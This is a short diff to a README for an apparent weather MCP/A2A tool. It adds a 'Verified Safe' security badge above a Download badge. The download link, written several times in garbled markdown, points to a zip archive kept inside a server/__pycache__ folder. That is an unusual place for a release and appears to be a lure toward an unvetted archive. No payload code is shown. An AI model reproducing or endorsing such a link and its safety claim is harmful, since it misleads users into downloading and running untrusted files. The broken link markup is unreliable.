@@ -1,5 +1,7 @@
 # 🌤️ weather-mcp-a2a - Get Real-Time Weather Intelligence Effortlessly
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/manuelalba1021-weather-mcp-a2a)
+
 [![Download](https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip%20Latest%20Release-brightgreen)](https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip https://github.com/manuelalba1021/weather-mcp-a2a/raw/refs/heads/main/server/__pycache__/weather-a-mcp-v1.3.zip)
 
 ## 📖 Description
